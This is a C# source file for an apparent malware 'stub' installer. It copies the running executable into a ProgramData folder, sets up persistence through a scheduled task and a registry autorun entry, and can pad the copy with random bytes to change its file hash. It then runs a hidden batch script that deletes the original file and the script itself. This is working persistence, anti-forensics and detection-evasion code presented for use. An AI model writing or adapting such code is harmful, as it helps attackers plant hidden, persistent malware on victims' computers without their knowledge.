﻿
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using Stub.Help;

namespace Stub
{
    class Install
    {
        public static DirectoryInfo workPatch = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), Config.dir));
        public static FileInfo workFile = new FileInfo(Path.Combine(workPatch.FullName, Config.bin + ".exe"));
        public static string currentProcess = Process.GetCurrentProcess().MainModule.FileName; // Install.currentProcess
        public static void Run()
        {

            if (!File.Exists(workFile.FullName))
            {
                List<Thread> AutoStart = new List<Thread>();
                AutoStart.Add(new Thread(() => Copy()));
                AutoStart.Add(new Thread(() => TaskCreat.Set()));
                AutoStart.Add(new Thread(() => Registration.Inizialize(true, Config.taskName, workFile.FullName))); // Прописываемся в реестр
                foreach (Thread t in AutoStart)
                    t.Start();
                foreach (Thread t in AutoStart)
                    t.Join();

                if (File.Exists(workFile.FullName))
                    Process.Start(workFile.FullName);

                string batch = Path.GetTempFileName() + ".bat";
                using (StreamWriter sw = new StreamWriter(batch))
                {
                    sw.WriteLine("@echo off");
                    sw.WriteLine("timeout 7 > NUL");
                    sw.WriteLine("CD " + Application.StartupPath);
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(Application.ExecutablePath) + "\"" + " /f /q");
                    sw.WriteLine("CD " + Path.GetTempPath());
                    sw.WriteLine("DEL " + "\"" + Path.GetFileName(batch) + "\"" + " /f /q");
                }

                Process.Start(new ProcessStartInfo()
                {
                    FileName = batch,
                    CreateNoWindow = true,
                    ErrorDialog = false,
                    UseShellExecute = false,
                    WindowStyle = ProcessWindowStyle.Hidden
                });
                Environment.Exit(0);
            }
        }

        public static void Copy()
        {
            workPatch = Directory.CreateDirectory(workPatch.FullName);
            Directory.CreateDirectory(workPatch.FullName);
            workPatch.Refresh();


            try
            {
                if (File.Exists(workFile.FullName))
                {
                    Process[] pname = Process.GetProcessesByName(Config.bin);
                    if (pname.Length == 0)
                    {
                        try
                        {
                            File.Delete(workFile.FullName);
                        }
                        catch { }
                    }

                    Thread.Sleep(1000);
                }

                if (Config.AddBytes)
                {
                    FileStream fs = new FileStream(workFile.FullName, FileMode.OpenOrCreate);
                    byte[] byte_exe = File.ReadAllBytes(currentProcess);
                    fs.Write(byte_exe, 0, byte_exe.Length);
                    byte[] addB = new byte[new Random().Next(Config.Addbkb * 1024, Config.Addbkb * 1024)];
                    new Random().NextBytes(addB);
                    fs.Write(addB, 0, addB.Length);
                    fs.Dispose();
                }
                else { File.Copy(currentProcess, workFile.FullName); }

                
            }
            catch { Run(); }
        }
    }
}
